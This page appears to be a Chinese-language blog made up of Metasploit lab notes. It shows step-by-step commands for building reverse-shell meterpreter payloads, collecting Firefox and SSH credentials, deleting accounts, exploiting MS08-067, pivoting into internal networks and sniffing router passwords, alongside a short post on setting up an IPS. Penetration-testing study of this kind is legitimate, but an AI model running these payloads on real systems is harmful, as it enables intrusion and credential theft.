                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  3 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-POST模块"><a href="#1-POST模块" class="headerlink" title="1. POST模块"></a>1. POST模块</h4><ul>
<li>ARP扫描：<strong><code>🔺命令：run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24</code></strong> </li>
<li>虚拟机检测：<strong><code>🔺命令：run post/windows/gather/checkvm</code></strong> </li>
<li>身份信息收集：<strong><code>🔺命令：run post/windows/gather/credentials/credential_collector</code></strong> </li>
<li>枚举应用程序：<strong><code>🔺命令：run post/windows/gather/enum_applications</code></strong> </li>
<li>枚举目标机器账号登陆：<strong><code>🔺命令：run post/windows/gather/enum_logged_on_users</code></strong> </li>
<li>枚举SNMP服务：<strong><code>🔺命令：run post/windows/gather/enum_snmp</code></strong> </li>
<li>本地存在漏洞：<strong><code>🔺命令：run post/multi/recon/local_exploit_suggester</code></strong> </li>
<li>删除用户账号：<strong><code>🔺命令：run post/windows/manage/delete_user USERNAME=yuanfh</code></strong> </li>
<li>运行环境变量信息：<strong><code>🔺命令：run post/multi/gather/env</code></strong> </li>
<li>收集firefox保存的浏览器的账号密码：<strong><code>🔺命令：run post/multi/gather/firefox_creds</code></strong> </li>
<li>ssh登陆信息：<strong><code>🔺命令：run post/multi/gather/ssh_creds</code></strong> </li>
<li>检查目标机器程序是否恶意程序：<strong><code>🔺命令：run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe</code></strong>（上传到各大查杀网站）</li>
</ul>
<h4 id="2-实验准备–POST模块"><a href="#2-实验准备–POST模块" class="headerlink" title="2. 实验准备–POST模块"></a>2. 实验准备–POST模块</h4><ul>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -a x86 --platform windows -b &#39;\x00&#39; -e x86/shikata_ga_nai -f exe -o a.exe</code></strong></li>
<li><strong><code>🔺命令：cp a.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP地址</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set exitonsession false</code></strong>（退出session继续监听）</li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：jobs</code></strong><ul>
<li>查看job是否一直有任务</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
<li>浏览器访问<a href="http://Kali的IP地址/a.exe，下载a.exe" target="_blank" rel="noopener">http://Kali的IP地址/a.exe，下载a.exe</a></li>
<li>执行a.exe</li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-实验–POST模块"><a href="#3-实验–POST模块" class="headerlink" title="3. 实验–POST模块"></a>3. 实验–POST模块</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong><ul>
<li><strong><code>🔺命令：run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24</code></strong></li>
<li><strong><code>🔺命令：run post/windows/gather/checkvm</code></strong> </li>
<li><strong><code>🔺命令：run post/windows/gather/credentials/credential_collector</code></strong></li>
<li><strong><code>🔺命令：run post/windows/gather/enum_applications</code></strong></li>
<li><strong><code>🔺命令：run post/windows/gather/enum_logged_on_users</code></strong></li>
<li><strong><code>🔺命令：run post/windows/gather/enum_snmp</code></strong></li>
<li><strong><code>🔺命令：run post/multi/recon/local_exploit_suggester</code></strong></li>
<li><strong><code>🔺命令：run post/windows/manage/delete_user USERNAME=yuanfh</code></strong></li>
<li><strong><code>🔺命令：run post/multi/gather/env</code></strong> </li>
<li><strong><code>🔺命令：run post/multi/gather/firefox_creds</code></strong> </li>
<li><strong><code>🔺命令：run post/multi/gather/ssh_creds</code></strong> </li>
<li><strong><code>🔺命令：run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe</code></strong><ul>
<li>▲ 2020.03.04 The requests resource is not among the finished,queued or pending scans，猜测上不了VT网站的原因</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-自动执行脚本"><a href="#4-自动执行脚本" class="headerlink" title="4. 自动执行脚本"></a>4. 自动执行脚本</h4><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong></li>
<li>▲ AutoRunScript每次只允许指定一项</li>
<li>自动执行meterpreter脚本<ul>
<li><strong><code>🔺命令：show Advanced</code></strong>（高级选项）<ul>
<li>迁移到指定进程：<strong><code>🔺命令：set AutoRunScript migrate -n explorer.exe</code></strong></li>
<li>编辑目标机器的HOST文件：<strong><code>🔺命令：set AutoRunScript hostsedit -e 1.1.1.1,www.baidu.com</code></strong></li>
<li><strong><code>🔺命令：set InitialAutoRunScript checkvm</code></strong> </li>
</ul>
</li>
</ul>
</li>
<li>自动执行post模块<ul>
<li><strong><code>🔺命令：show Advanced</code></strong>（高级选项）<ul>
<li><strong><code>🔺命令：set InitialAutoRunScript migrate -n explorer.exe</code></strong> </li>
<li><strong><code>🔺命令：set AutoRunScript post/windows/gather/dumplinks</code></strong>（前提：需提前把自己<strong><code>🔺命令：migrate</code></strong>到目标用户上）</li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Pivoting%E9%9A%A7%E9%81%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Pivoting%E9%9A%A7%E9%81%93/" itemprop="url">Kali Linux笔记(一百一十)：MSF后渗透测试--Pivoting隧道</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T00:18:58+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Pivoting跳板-枢纽-支点"><a href="#1-Pivoting跳板-枢纽-支点" class="headerlink" title="1. Pivoting跳板 / 枢纽 / 支点"></a>1. Pivoting跳板 / 枢纽 / 支点</h4><ul>
<li>利用已经控制的一台计算机作为入侵内网的跳板</li>
<li>在其他内网计算机看来访问全部来自于跳板机</li>
<li><strong><code>🔺命令：run autoroute -s 1.1.1.0/24</code></strong>  #不能访问外网的被攻击目标内网网段<ul>
<li>▲ 再深一层的内网，也可以使用，比如Window 7双网卡，第一块网卡接防火墙，第二块网卡接更深一层的私网，且不可路由</li>
</ul>
</li>
</ul>
<h4 id="2-实验–Pivoting自动路由"><a href="#2-实验–Pivoting自动路由" class="headerlink" title="2. 实验–Pivoting自动路由"></a>2. 实验–Pivoting自动路由</h4><ul>
<li>Mono 1<ul>
<li>网卡1模式为Host-only-2模式，检查网络</li>
<li>网卡2模式为Bridge模式，检查网络</li>
<li>LAN → 1.1.1.1 WAN → 192.168.0.110</li>
</ul>
</li>
<li>Mono 2<ul>
<li>网卡1模式为Host-only-3模式，检查网络</li>
<li>网卡2模式为Bridge模式，检查网络</li>
<li>2 set up A LAN Address<ul>
<li>2.1.1.1</li>
<li>24</li>
<li>dhcp</li>
<li>2.1.1.10</li>
<li>2.1.1.100</li>
</ul>
</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Host-only-2模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>浏览器访问mono 1<ul>
<li>Rules → WAN → LAN -&gt; Any</li>
<li>NAT → Inbound → <ul>
<li>External port range → from/to other4444</li>
<li>NAT IP → Kali的IP</li>
<li>Local port → other 4444</li>
<li>Auto-add a firewall rule to permit traffic through this NAT rule → Apply</li>
</ul>
</li>
<li>查看Rules → WAN是否添加规则正常</li>
<li>NAT → Inbound → <ul>
<li>External port range → from/to other80</li>
<li>NAT IP → Kali的IP</li>
<li>Local port → other 80</li>
<li>Auto-add a firewall rule to permit traffic through this NAT rule → Apply</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li>物理主机访问mono 1的Brige模式的IP，是否能看到Kali开启的Web服务</li>
</ul>
</li>
<li>Window 7<ul>
<li>网卡模式为Host-only-3模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>浏览器访问mono 2<ul>
<li>Rules → LAN → LAN -&gt; ANY<ul>
<li>Action → Pass</li>
<li>Interface → LAN</li>
<li>Sourece → LAN subnet</li>
<li>save</li>
</ul>
</li>
</ul>
</li>
<li>浏览器访问百度尝试</li>
<li>关闭Window 7的UAC验证</li>
<li>重启电脑</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=mono 1的Brige模式下的IP地址 LPORT=4444 -a x86 --platform windows -b &#39;\x00\xff&#39; -e x86/shikata_ga -f exe a.exe</code></strong></li>
<li><strong><code>🔺命令：cp a.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP地址</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://mono" target="_blank" rel="noopener">http://mono</a> 1的Brige模式下的IP地址/a.exe，下载a.exe</li>
<li>执行a.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li>**`🔺命令：getuid</li>
<li><strong><code>🔺命令：run autoroute -s 2.1.1.0/24</code></strong></li>
<li><strong><code>🔺命令：run autoroute -p</code></strong> 查看路由表</li>
</ul>
</li>
</ul>
<h4 id="3-自动路由显示场景"><a href="#3-自动路由显示场景" class="headerlink" title="3. 自动路由显示场景"></a>3. 自动路由显示场景</h4><ul>
<li>利用win 7攻击内网XP（对比XP有无外网访问权的情况）</li>
<li>扫描内网：<strong><code>🔺命令：use auxiliary/scanner/portscan/tcp</code></strong></li>
<li>实验环境准备<ul>
<li>Window XP SP3 <ul>
<li>网卡模式为Host-only-3模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-实验–攻击内网其他主机"><a href="#4-实验–攻击内网其他主机" class="headerlink" title="4. 实验–攻击内网其他主机"></a>4. 实验–攻击内网其他主机</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use auxiliary/scanner/portscan/tcp</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS 2.1.1.9-2.1.1.12</code></strong></li>
<li><strong><code>🔺命令：set PORTS 139,445</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：db_nmap -sV -p445 -A -Pn Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Window 7的IP</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li>win 7若开启防火墙，可能要通过之前的shell来添加访问规则</li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：background</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST mono的IP</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li>查看是否拿到shell</li>
<li>删除路由</li>
<li><strong><code>🔺命令：session -i 1</code></strong><ul>
<li><strong><code>🔺命令：run autoroute -h</code></strong></li>
<li><strong><code>🔺命令：run autoroute -d -s 2.1.1.0/24</code></strong><ul>
<li>-s：增加路由记录</li>
<li>-d -s：删除路由记录</li>
</ul>
</li>
<li><strong><code>🔺命令：run autoroute -p</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=cde4WOBGkE-67B7-t8x-uUPvvcCMsAeX3Dr5Afm8UK9FyB5CvLHNttNiQyVEIFWDrVNP0WqaMCYTlsb6QNBnBUbX67mNGWeyEfaCEFEsVt_oWPp-Yt9g11EeV20nAFs3GZ1L7jM&file_name=/Pivoting%E8%87%AA%E5%8A%A8%E8%B7%AF%E7%94%B1.png" alt="Pivoting自动路由"></p>
<h4 id="5-Pivoting端口转发–Portfwd"><a href="#5-Pivoting端口转发–Portfwd" class="headerlink" title="5.  Pivoting端口转发–Portfwd"></a>5.  Pivoting端口转发–Portfwd</h4><ul>
<li>利用已经被控计算机，在Kali与攻击目标之间实现端口转发</li>
<li><strong><code>🔺命令：portfwd add -L LIP -l LPORT -r RIP -p RPORT</code></strong></li>
<li><strong><code>🔺命令：portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389</code></strong> </li>
<li><strong><code>🔺命令：portfwd list  /  delete  /  flush</code></strong> </li>
</ul>
<h4 id="6-实验–Portfwd"><a href="#6-实验–Portfwd" class="headerlink" title="6. 实验–Portfwd"></a>6. 实验–Portfwd</h4><ul>
<li>Window XP SP3<ul>
<li>开启远程桌面</li>
</ul>
</li>
<li>Kali<ul>
<li>在上述实验Kali与Window 7建立的session的基础上</li>
<li><strong><code>🔺命令：session -i 1</code></strong><ul>
<li><strong><code>🔺命令：portfwd</code></strong></li>
<li><strong><code>🔺命令：portfwd add -L Kali的IP -l 3389 -r Window XP的IP -p 3389</code></strong></li>
<li><strong><code>🔺命令：portfwd list</code></strong>（Kali的IP）</li>
<li><strong><code>🔺命令：portfwd add -l 4489 -r Window XP的IP -p 3389</code></strong></li>
<li><strong><code>🔺命令：protfwd list</code></strong>（0.0.0.0）</li>
</ul>
</li>
<li>rdesktop Kali的IP的IP查看是否能开启远程桌面</li>
<li><strong><code>🔺命令：rdesktop 127.0.0.1:4489</code></strong>查看是否能开启远程桌面</li>
<li><strong><code>🔺命令：session -i 1</code></strong><ul>
<li>删除所有链接：<strong><code>🔺命令：portfwd flush</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/IPS%E7%AC%94%E8%AE%B0-2%EF%BC%9AIPS%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/03/IPS%E7%AC%94%E8%AE%B0-2%EF%BC%9AIPS%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" itemprop="url">IPS笔记-2：IPS环境搭建</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T21:08:12+08:00">
                2020-03-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/IPS/" itemprop="url" rel="index">
                    <span itemprop="name">IPS</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  97 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-选择GNS"><a href="#1-选择GNS" class="headerlink" title="1. 选择GNS"></a>1. 选择GNS</h4><ul>
<li>GNS可以导入外部模块，但PT不行</li>
</ul>
<h4 id="2-初始化IPS"><a href="#2-初始化IPS" class="headerlink" title="2. 初始化IPS"></a>2. 初始化IPS</h4><ul>
<li>setup<ul>
<li>Enter host name:IPS</li>
<li>Enter IP Interface:设置VM8的IP地址以及网关</li>
<li>▲ 其他默认</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=5a86oi6yOTNS07YY3OINzUyHIwuuliu_-E2Ev2gCAyKHNmMVEOs_yLSO8-UW6IEffU0sWSsKMggzYWSey71c7PX90rv9C32QR1Ij83hgNSSoepnsuv83F0LfR-Y6GHWj-JVdbAHci3ShMIlfI8UbdlocgWrJtQnpikAVaA&file_name=/IPS-4240%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE.png" alt="IPS-4240初始化配置"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=5cd1C31nttN6F2NrCqMvUTlYTRM-gTUPYBIkcU2ZDFalsZSlFGfK52l8mVRZ-tEFZEa3p77hNYiqUnaG67g5rTtqoZCQKeO4zmGYadRS4v57bXe-fjYg5Rk-0pfeAhpNtDnBENsHQdBRCoh-Yigu_9NYH36RQubE6vX12fY6WeDq_Q&file_name=/IPS-4240%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="IPS-4240初始化配置成功"></p>
<h4 id="3-IME"><a href="#3-IME" class="headerlink" title="3. IME"></a>3. IME</h4><ul>
<li>安装IME对密码有要求，弱口令无法登陆</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=eb2fwpyckL9FPJ5wcHVi0lSuddeATvJK5QeZHTbijiWaH-l0raMvFTq-G9173Oi5q7lLbiczb_39Ezmk6ZnpQrwKBjPSM6m9L0ZOfVn8ittYw8CTT7CuI3PMbQG_GL2n_Nq0mIjXzRtgEe0VwKIIcz-sKAgpmDQtcK2Yt68AAPM&file_name=/IME%E8%AE%BE%E7%BD%AE%E7%AE%80%E5%8D%95%E5%AF%86%E7%A0%81%E6%8A%A5%E9%94%99.png" alt="IME设置简单密码报错"></p>
<ul>
<li>配置IME<ul>
<li>添加IPS的IP地址以及端口</li>
<li>添加IPS的账号密码</li>
<li>▲ 配置的时候，需要设置Configuration User和Event Subscription User</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=33b3qw5fIHWgmXDcofePJLbKG6UDncCVjUd7UlRAgtKlR3faQHZbAuBi6sSEfPol5BsZT5yAcjtCHgyjdkAaQdMZcaTL12ghYEA1Q0h7N5oG1B1kAmZMwLVpXAo5eANpTEPf-3BX4bilrNGHPkqpLpSVtIc&file_name=/IME%E6%B7%BB%E5%8A%A0%E8%AE%BE%E5%A4%87.png" alt="IME添加设备"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=26efovyBXGrEnXPg1tKkvAqXEX8VfUwHamdODeou4Dbi_xmeExU2WS1Z-AU-0HRHFo0uhTslY1YvrPdwyfYkIacp_oKL4nMdxQuI4WV9pU7TFinQiT1ghI2yquwetzY0N1kBAE-cEbpUNTsCc5T--bBRKcM&file_name=/IME%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" alt="IME配置成功"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=1fa40hgQzgiSfr4horT9aqT9yZfwcENsFf360gWv-CM_3qaTRbb4_ekpP9-QMwbBNqHMvzWFtFFqgtqSk46XFwn078A-hb_SVYdEePQeYNqy14_7HriLq-hTPhPcdI7wgV1aU0F_dv06nlIsMHIVcdrkIG2EEQ&file_name=/IPS%20Configuration.png" alt="IPS Configuration"></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B9%9D)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86+%E5%90%8E%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B9%9D)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86+%E5%90%8E%E9%97%A8/" itemprop="url">Kali Linux笔记(一百零九)：MSF后渗透测试--信息收集+后门</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-03T15:35:04+08:00">
                2020-03-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  988 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  4 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1. 实验环境"></a>1. 实验环境</h4><ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong> 查看IP地址</li>
<li>关闭防火墙，关闭UAC并重启</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong> 查看IP地址</li>
<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong> </li>
<li><strong><code>🔺命令：service apache2 start</code></strong> </li>
<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong> </li>
<li><strong><code>🔺命令：msfconsole -q</code></strong> </li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> <ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：exploit</code></strong> </li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
<li>双击打开1.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
</ul>
<h4 id="2-抓包（metrepreter）"><a href="#2-抓包（metrepreter）" class="headerlink" title="2. 抓包（metrepreter）"></a>2. 抓包（metrepreter）</h4><ul>
<li>在内存中缓存区块循环存储抓包（50000包），不写硬盘</li>
<li>智能过来meterpreter流量，传输全程使用SSL/TLS加密</li>
<li>Kali<ul>
<li><strong><code>🔺命令：load sniffer</code></strong> <ul>
<li><strong><code>🔺命令：sniffer_interfaces</code></strong>  </li>
<li><strong><code>🔺命令：sniffer_start 2</code></strong>  </li>
<li><strong><code>🔺命令：sniffer_dump 2 1.cap</code></strong>  </li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问路由器，输入密码</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：sniffer_dump 2 2.cap</code></strong> （含有密码信息）</li>
</ul>
</li>
</ul>
<h4 id="3-解码"><a href="#3-解码" class="headerlink" title="3. 解码"></a>3. 解码</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use auxiliary/sniffer/psnuffle</code></strong> </li>
<li><strong><code>🔺命令：set PCAPFILE /root/2.cap</code></strong> </li>
